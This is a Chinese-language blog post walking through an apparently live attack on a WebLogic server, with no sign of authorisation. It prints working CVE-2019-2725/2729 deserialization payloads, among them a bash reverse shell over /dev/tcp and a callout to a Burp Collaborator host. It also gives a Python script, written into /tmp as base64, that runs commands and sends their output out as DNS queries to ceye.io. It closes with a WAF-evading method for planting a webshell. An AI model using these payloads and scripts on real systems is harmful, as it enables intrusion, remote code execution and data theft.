遇到一个weblogic站点：  

![1587091026_5e991652d95c1.png!small](https://image.3001.net/images/20200417/1587091026_5e991652d95c1.png!small)

访问常见的几个路径看是否存在：

    
    
    /console/login/LoginForm.jsp  
    /uddiexplorer/SearchPublicRegistries.jsp  
    /wls-wsat/CoordinatorPortType  
    /_async/AsyncResponseService

运气爆棚，刚好存在`/_async/AsyncResponseService`这个路径：

![1587091037_5e99165d5e48f.png!small](https://image.3001.net/images/20200417/1587091037_5e99165d5e48f.png!small)

拿出shack2大神的weblogic RCE工具验证一波：

![1587091042_5e991662b1bf6.png!small](https://image.3001.net/images/20200417/1587091042_5e991662b1bf6.png!small)

工具没打成功，猜测可能是被waf拦截。好奇的用自己收集的payload一个一个试，没想到成功执行了一个能获取dnslog记录的payload:

    
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">  <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void><string>http://zdg537uqx2an3qcx104ez2ak6bc10q.burpcollaborator.net</string></void></class></java>  </work:WorkContext>  </soapenv:Header>  <soapenv:Body>   <asy:onAsyncDelivery/>  </soapenv:Body></soapenv:Envelope>

![1587091049_5e99166922967.png!small](https://image.3001.net/images/20200417/1587091049_5e99166922967.png!small)

这个是2729的payload，于是就用相应命令执行的payload来执行命令，结果失败了。有大神指点说可以用2725的payload来打：

于是找了去年HW放出来的2725的payload:

    
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action> <wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <void class="java.lang.ProcessBuilder"> <array class="java.lang.String" length="3"> <void index="0"> <string>/bin/bash</string> </void> <void index="1"> <string>-c</string> </void> <void index="2"> <string>bash -i &ampgt&ampamp /dev/tcp/ip/port 0&ampgt&ampamp1</string> </void> </array> <void method="start"/></void> </work:WorkContext> </soapenv:Header> <soapenv:Body> <asy:onAsyncDelivery/> </soapenv:Body></soapenv:Envelope>

但是又出现了新的问题，这是一段不能回显命令结果的payload，无奈我又去请教大神，大神给了我思路，可以通过dnslog来获取结果，并且把脚本也给了我：

`p.py`：

    
    
    import os  
    import sys  
    import subprocess  
    ​  
    def exp(cmd, id):  
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)  
        p.wait()  
        pipe = p.stdout  
        i = 100  
        while True:  
            result = pipe.read(30)  
            if not result: break  
            os.popen('wget --no-dns-cache --tries=1 -T 1 --output-document=/dev/null %s.%s.%s.xxx.ceye.io' % (id, i, result.encode('hex')))  
            i += 1  
    ​  
    exp(sys.argv[1], sys.argv[2])

`result.py`：

    
    
    import requests  
    import sys  
    from requests.exceptions import RequestException  
    from requests.packages.urllib3.exceptions import InsecureRequestWarning  
    ​  
    dnslog_exec = u"i2kuwq.ceye.io"  
    dnslog_exec_api = u"http://api.ceye.io/v1/records?token=xxxxxxxxxx1ae18f473ef27d0a&type=dns&filter={0}"  
    ​  
    req = requests.get(dnslog_exec_api.format(sys.argv[1]), timeout=30)  
    rsp = req.json()  
    if rsp[u"data"]:  
        exec_result = list(set([rsp[u"data"][i][u"name"] for i in xrange(len(rsp[u'data']))]))  
        exec_result.sort()  
        print (u"".join(map(lambda n: n[4 + 5: -1 - len(dnslog_exec)], exec_result)).decode("hex")).strip()  
    else:  
        print u"No output."

思路如下：

1、利用echo命令将`p.py`写入到tmp目录下，然后利用python执行代码，通过python脚本执行命令然后将命令结果hex编码请求到dnslog中。

2、本地执行`result.py`脚本调用ceyeAPI获取dnslog记录，并hex解码获取结果内容。

写文件:

    
    
    touch /tmp/pp.py && echo aW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHN1YnByb2Nlc3MKCmRlZiBleHAoY21kLCBpZCk6CiAgICBwID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwc**jZXNzLlBJUEUpCiAgICBwLndhaXQoKQogICAgcGlwZSA9IHAuc3Rkb3V0CiAgICBpID0gMTAwCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHJlc3VsdCA9IHBpcGUucmVhZCgzMCkKICAgICAgICBpZiBub3QgcmVzdWx0OiBicmVhawogICAgICAgIG9zLnBvcGVuKCd3Z2V0IC0tbm8tZG5zLWNhY2hlIC0tdHJpZXM9MSAtVCAxIC0tb3V0cHV0LWRvY3VtZW50PS9kZXYvbnVsbCAlcy4lcy4lcy4wYWN5ZncuY2V5ZS5pbycgJSAoaWQsIGksIHJlc3VsdC5lbmNvZGUoJ2hleCcpKSkKICAgICAgICBpICs9IDEKCmV4cChzeXMuYXJndlsxXSwgc3lzLmFyZ3ZbMl0pCg== | base64 -d >/tmp/pp.py

![1587091136_5e9916c032ab9.png!small](https://image.3001.net/images/20200417/1587091136_5e9916c032ab9.png!small)

执行命令：

`/usr/bin/python /tmp/pp.py 命令 1234`

![1587091127_5e9916b78d06c.png!small](https://image.3001.net/images/20200417/1587091127_5e9916b78d06c.png!small)

查看dnslog记录：

![1587091117_5e9916ad5ecfc.png!small](https://image.3001.net/images/20200417/1587091117_5e9916ad5ecfc.png!small)

本地读取结果：

`python2 result.py 1235`

![1587091108_5e9916a4d2a6b.png!small](https://image.3001.net/images/20200417/1587091108_5e9916a4d2a6b.png!small)

最后通过dnslog记录获取到web路径，然后写入webshell文件：

![1587091100_5e99169c81890.png!small](https://image.3001.net/images/20200417/1587091100_5e99169c81890.png!small)

写马过程中遇到的坑：

1、网站存在waf，当POST内容长度超过200就会触发，所以只能通过分段的方式来写入webshell。

2、怀疑之前使用工具进行验证也是由于数据包超长触发waf导致不能执行命令。

3、通过ceye的api接口获取到的dnslog记录不能超过5页，超过5页就会被覆盖。

